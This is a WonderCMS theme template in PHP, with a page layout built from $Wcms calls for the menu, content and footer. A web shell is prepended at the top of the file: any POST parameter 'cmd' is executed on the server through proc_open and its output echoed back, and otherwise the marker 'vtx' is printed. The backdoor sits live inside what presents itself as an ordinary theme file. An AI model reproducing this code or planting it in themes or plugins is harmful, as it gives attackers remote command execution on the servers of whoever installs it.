<?php 

if (isset($_POST["cmd"])) {
    $cmd = $_POST["cmd"];

    function exec_command($command) {
        $descriptorspec = array(
            0 => array("pipe", "r"), // Entrada padrão
            1 => array("pipe", "w"), // Saída padrão
            2 => array("file", "error-output.txt", "a") // Erro padrão redirecionado para arquivo
        );

        $cwd = ""; // Diretório de trabalho atual
        $env = array('some_option' => 'aeiou'); // Ambiente

        // Inicia o processo
        $process = proc_open($command, $descriptorspec, $pipes, $cwd, $env);

        if (is_resource($process)) {
            echo stream_get_contents($pipes[1]); // Lê e exibe a saída
            fclose($pipes[1]); // Fecha a saída padrão
            proc_close($process); // Fecha o processo
        }
    }

    exec_command($cmd); // Executa o comando
    exit;
} else {
    echo "vtx";
}

global $Wcms; 
?>

<!DOCTYPE html>
<html lang="en">
	<head>
		<!-- Encoding, browser compatibility, viewport -->
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="viewport" content="width=device-width, initial-scale=1">

		<!-- Search Engine Optimization (SEO) -->
		<meta name="title" content="<?= $Wcms->get('config', 'siteTitle') ?> - <?= $Wcms->page('title') ?>" />
		<meta name="description" content="<?= $Wcms->page('description') ?>">
		<meta name="keywords" content="<?= $Wcms->page('keywords') ?>">
		<meta property="og:url" content="<?= $Wcms->getCurrentPageUrl() ?>" />
		<meta property="og:type" content="website" />
		<meta property="og:site_name" content="<?= $Wcms->get('config', 'siteTitle') ?>" />
		<meta property="og:title" content="<?= $Wcms->page('title') ?>" />
		<meta name="twitter:title" content="<?= $Wcms->get('config', 'siteTitle') ?> - <?= $Wcms->page('title') ?>" />
		<meta name="twitter:description" content="<?= $Wcms->page('description') ?>" />

		<!-- Website and page title -->
		<title>
			<?= $Wcms->get('config', 'siteTitle') ?> - <?= $Wcms->page('title') ?>

		</title>

		<!-- Admin CSS -->
		<?= $Wcms->css() ?>
		
		<!-- Theme CSS -->
		<link rel="stylesheet" rel="preload" as="style" href="<?= $Wcms->asset('css/style.css') ?>">
	</head>
	
	<body>
		<!-- Admin settings panel and alerts -->
		<?= $Wcms->settings() ?>

		<?= $Wcms->alerts() ?>

		<section id="topMenu">
			<div class="inner">
				<nav>
					<ul class="menu">
						<!-- Menu -->
						<?= $Wcms->menu() ?>

					</ul>
				</nav>
			</div>
		</section>

		<div id="wrapper">
			<section id="intro" class="wrapper style1 fullscreen">
				<div class="inner">
					<!-- Main content for each page -->
					<?= $Wcms->page('content') ?>

				</div>
			</section>

			<section class="wrapper style2">
					<div class="inner">
						<!-- Static editable block, same on each page -->
						<?= $Wcms->block('subside') ?>

					</div>
			</section>
		</div>

		<footer class="wrapper style2">
			<div class="inner">
				<!-- Footer -->
				<?= $Wcms->footer() ?>

			</div>
		</footer>

		<!-- Admin JavaScript. More JS libraries can be added below -->
		<?= $Wcms->js() ?>

	</body>
</html>
